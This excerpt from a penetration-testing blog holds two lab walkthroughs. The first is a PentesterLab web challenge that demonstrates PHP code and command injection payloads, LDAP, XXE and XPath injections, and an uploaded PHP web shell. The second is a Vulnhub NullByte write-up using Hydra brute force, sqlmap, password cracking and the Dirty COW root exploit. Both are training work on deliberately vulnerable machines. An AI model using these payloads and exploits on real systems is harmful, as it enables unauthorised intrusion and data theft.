<p><img class="center" src="/images/pentest/webpentester/codeinj2.png" title="&lsquo;code injection 2&rsquo; &lsquo;code injection&rsquo;" ></p>

<p>eval() now sees a strcmp, which is executed (but only with 1 parameter, hence the warning). Then eval goes further, sees our code and executes it (the warning doesn&rsquo;t stop the execution). And finally, eval reaches the leftovers, which have been commented out, so it does nothing.</p>

<p>This here was my favorite part in all the challenge!</p>

<p><strong>Example 3</strong></p>

<p>Here we have the familiar hello hacker message, but with a twist on the URL: <a href="http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer</a></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
</code></pre>

<p>?>
```</p>

<p>Ok, preg_replace searches inside the base parameter (Hello lamer) for matches to the pattern parameter (hacker) and replaces them with what&rsquo;s in the new parameter (hacker).</p>

<p>The problem with preg_replace is that it can be passed the modifier <a href="https://secure.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">e (PREG_REPLACE_EVAL)</a> that causes PHP to <a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">execute the replacement value</a>.</p>

<p>To exploit this, first we have to add the modifier to the pattern: <code>pattern=/lamer/e</code>. Then we put our code inside the new parameter: <code>new=phpinfo()</code>. The URL now looks like this: <a href="http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer</a></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example 4</strong></p>

<p>This one looks like the first example, but with a new addition in the code:</p>

<p><code>php
// ensure name is not empty
assert(trim("'".$_GET['name']."'"));
echo "Hello ".htmlentities($_GET['name']);
</code></p>

<p><a href="https://secure.php.net/manual/ro/function.assert.php">assert</a> checks if the assertions is false, but the most important thing that we need to know is: <strong>if the assertion is given as a string it will be evaluated as PHP code by assert()</strong>.</p>

<p>The assert returns true, because it checks that the name parameter = &lsquo;hacker&rsquo;, which it is. When injecting a single quote, we see this error:</p>

<p><code>plain
Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4
</code></p>

<p>I used a PHP sandbox to help me with this. Let&rsquo;s imagine that the name parameter is a simple string with the value of hacker:</p>

<p><code>php
$name = 'hacker';
</code></p>

<p>Thanks to the use of trim, assert will see (and try to evaluate) the value of &lsquo;hacker&rsquo;. Knowing this, if I try injecting <code>hacker'.phpinfo().&lsquo;</code>, inside the code I assume it will look like this:</p>

<p><code>php
$name = 'hacker'.phpinfo().'';
</code></p>

<p>With the string concatenation, phpinfo() is displayed, but we also see at the bottom of the page: <code>Hello hacker'.phpinfo().&lsquo;</code>. The assert was successful, and the code was executed.</p>

<h3>Commands injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/cmd1.png" title="&lsquo;cmd injection&rsquo; &lsquo;ping&rsquo;" ></p>

<p>It looks like a ping program:</p>

<p><code>php
&lt;?php
  system("ping -c 2 ".$_GET['ip']);
?&gt;
</code></p>

<p>You can chain another command after the ping one by doing this: <code>ip=127.0.0.1;whoami</code>. Below the ping output, you can now see the whoami output, which in this case is www-data</p>

<p><strong>Example 2</strong></p>

<p>This looks the same like the previous one, but let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/m&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> die("Invalid IP address");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>There is some regex added now to validate that the ip parameter will indeed look like in IP. However, similar to a previous example, the check won&rsquo;t look on further lines. We can use <code>%0a</code> to introduce a new line, and run our command there: <code>ip=127.0.0.1%0Apwd</code>. And the output is:</p>

<p>``` plain
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms</p>

<p>&mdash;&ndash; 127.0.0.1 ping statistics &mdash;&ndash;
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.012/0.017/0.022/0.005 ms
/var/www/commandexec
```</p>

<p><strong>Example 3</strong></p>

<p>Same-looking URL, and slightly different code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> header("Location: example3.php?ip=127.0.0.1");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>This time, the script will redirect the user if the ip parameter doesn&rsquo;t match the regex. However, the execution will continue, even if the browser gets redirected. To stop the execution altogether, it would be necessary to call the <em>die()</em> function after the <em>header()</em> function, which isn&rsquo;t happening in this case. So we can still inject a command, but we&rsquo;ll need to do it through another medium than the browser, or use a proxy. For this, I used Burp, sent the payload <code>ip=127.0.0.1;ls</code>, and looked inside the 302 response to find what I wanted to see:</p>

<p><code>plain
example1.php
example2.php
example3.php
index.html
</code></p>

<h3>LDAP attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap1.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 1&rsquo;" ></p>

<p>This is a new type of exercise, involving LDAP:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   if (isset($_GET[&ldquo;username&rdquo;])) {</p>

<pre><code> $user = "uid=".$_GET["username"]."ou=people,dc=pentesterlab,dc=com";
</code></pre>

<p>   }
   $lb = @ldap_bind($ld, $user,$_GET[&ldquo;password&rdquo;]);</p>

<pre><code>if ($lb) {
   echo "AUTHENTICATED";
}
else {
   echo "NOT AUTHENTICATED";
}
</code></pre>

<p>  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>First, let&rsquo;s learn more about <a href="http://projects.webappsec.org/w/page/13246947/LDAP%20Injection">LDAP</a>:</p>

<blockquote><p>LDAP Injection is an attack technique used to exploit web sites that construct LDAP statements from user-
supplied input.</p>

<p>Lightweight Directory Access Protocol (LDAP) is an open-standard protocol for both querying and
manipulating X.500 directory services. The LDAP protocol runs over Internet transport protocols, such as
TCP. Web applications may use user-supplied input to create custom LDAP statements for dynamic web page
requests.</p>

<p>When a web application fails to properly sanitize user-supplied input, it is possible for an attacker to
alter the construction of an LDAP statement. When an attacker is able to modify an LDAP statement, the
process will run with the same permissions as the component that executed the command. (e.g. Database
server, Web application server, Web server, etc.). This can cause serious security problems where the
permissions grant the rights to query, modify or remove anything inside the LDAP tree. The same advanced
exploitation techniques available in SQL Injection can also be similarly applied in LDAP Injection.</p></blockquote>

<p>This particular example is vulnerable to <a href="https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html">NULL bind</a>, where an anonymous user can access information from the LDAP directory without authentication. For this, the values sent to the server have to be null, so instead of just sending empty values, we have to completely remove them:</p>

<p><img class="center" src="/images/pentest/webpentester/ldap1_sol.png" title="&lsquo;ldap 1&rsquo; &lsquo;ldap null&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap2.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 2&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   $lb = @ldap_bind($ld, &ldquo;cn=admin,dc=pentesterlab,dc=com&rdquo;, &ldquo;pentesterlab&rdquo;);</p>

<pre><code>if ($lb) {
  $pass = "{MD5}".base64_encode(pack("H*",md5($_GET['password'])));
  $filter = "(&amp;(cn=".$_GET['name'].")(userPassword=".$pass."))";
  if (!($search=@ldap_search($ld, "ou=people,dc=pentesterlab,dc=com", $filter))) {
  echo("Unable to search ldap server&lt;br&gt;");
  echo("msg:'".ldap_error($ld)."'&lt;/br&gt;");
} else {
  $number_returned = ldap_count_entries($ld,$search);
  $info = ldap_get_entries($ld, $search);
  if ($info["count"] &lt; 1) {
     //NOK 
     echo "UNAUTHENTICATED";
  }
  else {
    echo "AUTHENTICATED as";
    echo(" ".htmlentities($info[0]['uid'][0]));
  } 
}
</code></pre>

<p>   }
  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>The goal here is to be able to authenticate with any password, and get information from the directory. Now, since the password is being hashed, the only likely place to inject into is the username. To learn more about LDAP, its rules and types of injection, I found a nice <a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">BlackHat whitepaper</a>. The key takeaway is that the injection will happen in the filter. In our case, the filter is:</p>

<p><code>plain
(&amp;(cn=name)(userPassword=password))
</code></p>

<p>We see here that filter uses <strong>&amp;</strong>, which specifies an AND condition, where both username and password have to be true. Remembering that we can only inject inside the username parameter, here&rsquo;s what we can do:</p>

<p><code>plain
(&amp;(cn=name)(cn=*))%00(userPassword=password))
</code></p>

<p>The ) closes the name filter, then we introduce an always true condition with the * wildcard, the closing ) matches the  one at the beginning of the filter, and the null byte..well, nullifies the rest of the filter.</p>

<p><img class="center" src="/images/pentest/webpentester/ldap2_sol.png" title="&lsquo;ldap 2&rsquo; &lsquo;ldap filter injection&rsquo;" ></p>

<h3>File Upload</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/upload1.png" title="&lsquo;upload1&rsquo; &lsquo;file upload&rsquo;" ></p>

<p>It looks like we can upload an image and find it in the <code>/upload/images/</code> directory:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);
  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir. $file))
  {
  echo &ldquo;Upload done&rdquo;;
  echo &ldquo;Your file can be found <a href=\"/upload/images/".htmlentities($file)."\">here</a>&rdquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>Obviously, I am thinking about uploading a PHP shell instead. But first, I wanted to see if there is anything already in the images folder, and I wasn&rsquo;t disappointed:</p>

<p><img class="center" src="/images/pentest/webpentester/hacker.png" title="&lsquo;lol&rsquo; &lsquo;haxxor chat&rsquo;" ></p>

<p>Ok, now it&rsquo;s time for the shell. I created a basic PHP shell:</p>

<p><code>php
&lt;?php
  system($_GET["cmd"]);
?&gt;
</code></p>

<p>Uploaded it, navigated to it and passed a command:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php?cmd=pwd
/var/www/upload/images
</code></p>

<p><strong>Example 2</strong></p>

<p>Same functionality, but this time the script doesn&rsquo;t allow PHP extensions:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);</p>

<pre><code>if (preg_match('/\.php$/',$file)) {
    DIE("NO PHP");
}
</code></pre>

<p>  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir . $file))
  {
  echo &lsquo;Upload done !&rsquo;;
  echo &lsquo;Your file can be found <a href="http://chousensha.github.io/upload/images/'.htmlentities($file).'">here</a>&rsquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>The code checks that an extension may not end in php. Uploading a .php file followed by a non-existent extension will cause the server to ignore the unknown extension and switch to the next one it knows. I uploaded the same shell as <code>ashell.php.fail</code>:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php.fail?cmd=ls%20/home
user
</code></p>

<h3>XML attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xml1.png" title="&lsquo;xml1&rsquo; &lsquo;xml 1&rsquo;" ></p>

<p>A twist on the previous challenges, this time with the use of XML:</p>

<p><code>php
Hello  
&lt;?php
  $xml=simplexml_load_string($_GET['xml']);
  print_r((string)$xml);
?&gt;
</code></p>

<p>This particular vulnerability revolves around <a href="https://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html#xml-injection">XML injection</a>:</p>

<blockquote><p>Custom entities can be defined by including them directly in an optional DOCTYPE and the expanded
value they represent may reference an external resource to be included. It is this capacity of
ordinary XML to carry custom references which can be expanded with the contents of an external
resources that gives rise to an XXE vulnerability.</p></blockquote>

<p>So, I defined the following entity:</p>

<p><code>plain
&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;
</code></p>

<p>This entity can be referenced with <code>&hacker;</code>. Of course, we will need to URL encode it. Here&rsquo;s the URL with the XML injection:</p>

<p><code>plain
192.168.217.138/xml/example1.php?xml=&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;&lt;test&gt;%26hacker%3B&lt;/test&gt;
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml1_inj.png" title="&lsquo;xml1&rsquo; &lsquo;xml injection&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p>Another hello page, but the URL is a bit different: <a href="http://192.168.217.138/xml/example2.php?name=hacker">http://192.168.217.138/xml/example2.php?name=hacker</a></p>

<p>``` php
  $x = &ldquo;<data><users><user><name>hacker</name><message>Hello hacker</message><password>pentesterlab</password></user><user><name>admin</name><message>Hello admin</message><password>s3cr3tP4ssw0rd</password></user></users></data>&rdquo;;</p>

<p>  $xml=simplexml_load_string($x);
  $xpath = &ldquo;users/user/name[.=&lsquo;&rdquo;.$_GET['name&rsquo;].&ldquo;&lsquo;]/parent::*/message&rdquo;;
  $res = ($xml->xpath($xpath));
  while(list( ,$node) = each($res)) {</p>

<pre><code>echo $node;
</code></pre>

<p>  }
```</p>

<p>We see here some XML data containing users and passwords, and user input being used to construct an <a href="https://www.w3schools.com/xml/xml_xpath.asp">XPATH</a> query. XPATH is used to navigate through elements and attributes in an XML document.</p>

<p>With a name of hacker, the XPATH would look like this:</p>

<p><code>plain
users/user/name[.='hacker']/parent::*/message
</code></p>

<p><a href="https://www.owasp.org/index.php/XPATH_Injection">XPATH injection</a> is similar to SQL injection. Here we can inject inside the name input to create an always true condition and get rid of the remaining query as follows: <code>hacker' or 1=1]%00</code>. Now the query looks like this:</p>

<p><code>plain
users/user/name[.='hacker' or 1=1]%00']/parent::*/message
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml2.png" title="&lsquo;xml2&rsquo; &lsquo;xpath injection&rsquo;" ></p>

<p>Wow, this was a really fun challenge, and I hadn&rsquo;t done a web app challenge in a while! Many thanks to PentesterLab for this challenge and their help when I had questions! They also have their own course for the challenge <a href="https://pentesterlab.com/exercises/web_for_pentester/course">here</a></p>

<p>Until next time, straight from the cow&rsquo;s mouth:</p>

<p>``` plain
/ You are fighting for survival in your \
\ own sweet and gentle way.             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte/"/>
    <updated>2017-04-18T11:00:06-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte</id>
    <content type="html"><![CDATA[<p>Today I&rsquo;m back with another vulnerable machine from Vulnhub! It&rsquo;s' been a while since I&rsquo;ve done one, and I was getting restless :D The target for today is called NullByte, and the goal is to read /root/proof.txt</p>

<!-- more -->


<p>I am going to use alternate tools to accomplish the enumeration tasks, instead of the usual Nmap ping scan. To identify the machine on the network, I&rsquo;ll go with <strong>netdiscover</strong> this time:</p>

<p>``` plain
netdiscover -r 192.168.217.0/24</p>

<p> Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 29 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1740</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> &hellip;          <br/>
 192.168.217.135 00:0c:29:57:bc:ff      4     240  Unknown vendor            <br/>
 &hellip;<br/>
```</p>

<p>By correlating the VMware MAC address with the one in the scan, I know the IP of the target is 192.168.217.135. Next, I port scanned the target:</p>

<p>``` plain
nmap -T4 -p- -sV 192.168.217.135</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-04-18 11:51 EDT
Nmap scan report for 192.168.217.135
Host is up, received arp-response (0.00016s latency).
Not shown: 65531 closed ports
Some closed ports may be reported as filtered due to &mdash;defeat-rst-ratelimit
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
53755/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```</p>

<p>Hmm, SSH on port 777? Oh well, let&rsquo;s look at the web server first:</p>

<p><img class="center" src="/images/pentest/nullbyte/web.png" title="&lsquo;nullbyte web&rsquo; &lsquo;nullbyte web page&rsquo;" ></p>

<p>Just an image, nothing in the source, no robots.txt. I needed to see if there are any other interesting directories, but instead of Dirbuster, I used TheColonial&rsquo;s <a href="https://github.com/OJ/gobuster">Gobuster</a>, which is a CLI tool written in Go:</p>

<p>``` plain
gobuster -u <a href="http://192.168.217.135/">http://192.168.217.135/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>Gobuster v1.2                OJ Reeves (@TheColonial)</h1>

<p>[+] Mode         : dir
[+] Url/Domain   : <a href="http://192.168.217.135/">http://192.168.217.135/</a>
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>[+] Status codes : 200,204,301,302,307</h1>

<p>/uploads (Status: 301)
/javascript (Status: 301)</p>

<h1>/phpmyadmin (Status: 301)</h1>

<p>```</p>

<p>Unfortunately, nothing in there either. The only thing that we have so far is an image. Let&rsquo;s hope there is no (or very rudimentary) steganography involved. I looked at the metadata of the image:</p>

<p><code>plain
exiftool main.gif
ExifTool Version Number         : 10.40
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2017:04:18 12:24:59-04:00
File Access Date/Time           : 2017:04:18 12:24:59-04:00
File Inode Change Date/Time     : 2017:04:18 12:24:59-04:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
</code></p>

<p>Hello there, conspicuous comment section! On a hunch, I tried navigating to a folder with that name on the web server, and finally seeing something promising:</p>

<p><img class="center" src="/images/pentest/nullbyte/key.png" title="&lsquo;key&rsquo; &lsquo;key form&rsquo;" ></p>

<p>And in the source, there is a comment stating that &ldquo;this form isn&rsquo;t connected to mysql, password ain&rsquo;t that complex&rdquo;. Ok, so no SQLi then. I took the hint and set to brute forcing the password. I used Hydra for this, so I had to take note of the form parameters:</p>

<p>``` html</p>

<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form>
</center>


<p>```</p>

<p>Also, trying the wrong key gives the message invalid key. Armed with this info, I constructed the Hydra query:</p>

<p><code>plain
hydra 192.168.217.135 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l meh -P /usr/share/dict/words -t 10 -w 10
</code>
This looks ugly, so let me break it into pieces:</p>

<ul>
<li><p>192.168.217.135 = target name</p></li>
<li><p>http-form-post = the method used</p></li>
<li><p>&ldquo;/kzMb5nVYJw/index.php&rdquo; = URL</p></li>
<li><p>key=^PASS^:invalid key" = the form parameter is called key, the PASS variable will be replaced with passwords from the password file, and Hydra will see as successful a response that doesn&rsquo;t contain the string &ldquo;invalid key&rdquo;</p></li>
<li><p>-l meh = you have to specify a username for Hydra to work, even though in this case there was no user, so I put something random</p></li>
<li><p>-P /usr/share/dict/words = password File</p></li>
<li><p>-t 10 = number of Threads</p></li>
<li><p>-w 10 = timeout value</p></li>
</ul>


<p>``` plain
Hydra v8.3 &copy; 2016 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-04-18 13:11:54
[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
[DATA] attacking service http-post-form on port 80
[STATUS] 1170.00 tries/min, 1170 tries in 00:01h, 98001 to do in 01:24h, 10 active
[STATUS] 1173.33 tries/min, 3520 tries in 00:03h, 95651 to do in 01:22h, 10 active
[STATUS] 1173.86 tries/min, 8217 tries in 00:07h, 90954 to do in 01:18h, 10 active
[STATUS] 1174.00 tries/min, 17610 tries in 00:15h, 81561 to do in 01:10h, 10 active
[STATUS] 1174.32 tries/min, 36404 tries in 00:31h, 62767 to do in 00:54h, 10 active
[80][http-post-form] host: 192.168.217.135   login: meh   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2017-04-18 13:45:57
```</p>

<p>We can see that Hydra found the password: elite ! Inputting it takes us to another form:</p>

<p><img class="center" src="/images/pentest/nullbyte/username.png" title="&lsquo;username&rsquo; &lsquo;search username&rsquo;" ></p>

<p>Whatever I entered into the form, I got the message &ldquo;Fetched data successfully&rdquo;. I looked at the source code and found another page to check:</p>

<p>``` html</p>

<p>Search for usernames: </p>


<hr>


<p><form action="420search.php" method="get">
Enter username:<br>
<input type="text" name="usrtosearch">
</form>
```</p>

<p>Navigating to 420search.php revealed 2 usernames:</p>

<p>``` plain
EMP ID :1
EMP NAME : ramses</p>

<h2>EMP POSITION :</h2>

<p>EMP ID :2
EMP NAME : isis</p>

<h2>EMP POSITION : employee</h2>

<p>Fetched data successfully
```
I pointed sqlmap to the usrtosearch parameter and was able to pull data from the DB:</p>

<p><code>plain
sqlmap -u "http://192.168.217.135/kzMb5nVYJw/420search.php?usrtosearch=isis" -p usrtosearch --dbms=MySQL --tables
...
[04:24:25] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, phpmyadmin, seth'
...
Database: seth
[1 table]
+----------------------------------------------+
| users                                        |
+----------------------------------------------+
...
</code></p>

<p>Next I enumerated the users table in the seth DB, and I got a password for ramses:</p>

<p><img class="center" src="/images/pentest/nullbyte/users.png" title="&lsquo;users&rsquo; &lsquo;users csv&rsquo;" ></p>

<p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>

<p>``` plain
ssh -p 777 <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#114;&#97;&#x6d;&#x73;&#101;&#115;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x32;&#49;&#55;&#x2e;&#x31;&#51;&#x35;">&#x72;&#97;&#109;&#x73;&#x65;&#115;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x32;&#x31;&#55;&#46;&#x31;&#51;&#53;</a>
<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x72;&#97;&#109;&#x73;&#101;&#x73;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x32;&#x31;&#x37;&#46;&#x31;&#x33;&#x35;">&#x72;&#97;&#109;&#115;&#101;&#115;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#49;&#55;&#46;&#x31;&#51;&#x35;</a>&rsquo;s password:</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
ramses@NullByte:~$
```</p>

<p>Time to look around the system!</p>

<p><code>plain
ls -l /home
total 12
drwxr-xr-x 2 bob    bob    4096 Aug  2  2015 bob
drwxr-xr-x 2 eric   eric   4096 Aug  2  2015 eric
drwxr-xr-x 2 ramses ramses 4096 Aug  2  2015 ramses
</code></p>

<p>Nothing interesting in those home directories. I looked at the kernel version next:</p>

<p>``` plain
uname -v</p>

<h1>1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)</h1>

<p>```</p>

<p>A bit of google-fu revealed that this kernel is vulnerable to CVE-2016-5195, or more popularly known as the <a href="https://www.exploit-db.com/exploits/40616/">Dirty Cow exploit</a> . It is possible to exploit a race condition to escalate privileges to root! I downloaded the source code to the NullByte VM, commented out the x64 payload and uncommented the x86 one, and then I compiled it with <code>gcc dirtycow.c -o dirtycow -pthread</code>. I got some warnings, but was able to run it successfully:</p>

<p><code>plain
./dirtycow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 53112
Racing, this may take a while..
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@NullByte:/home/ramses# whoami
root
</code></p>

<p>The system crashed shortly afterwards, so I followed the advice in the exploit source code and did <code>echo 0 > /proc/sys/vm/dirty_writeback_centisecs</code>, and it didn&rsquo;t crash anymore. With this, I was able to read the flag:</p>

<p>``` plain
cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d</p>

<p>It seems that you have pwned the box, congrats.
Now you done that I wanna talk with you. Write a walk &amp; mail at
<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#120;&#x6c;&#x79;&#48;&#x6e;&#x40;&#115;&#105;&#103;&#x61;&#105;&#110;&#116;&#46;&#111;&#x72;&#103;">&#120;&#x6c;&#121;&#48;&#x6e;&#x40;&#x73;&#105;&#103;&#x61;&#x69;&#110;&#x74;&#x2e;&#111;&#x72;&#103;</a> attach the walk and proof.txt
If sigaint.org is down you may mail at <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#110;&#x62;&#x73;&#x6c;&#x79;&#x30;&#x6e;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x6e;&#x62;&#115;&#108;&#121;&#x30;&#110;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#109;</a></p>

<p>USE THIS PGP PUBLIC KEY</p>

<p>&mdash;&mdash;-BEGIN PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
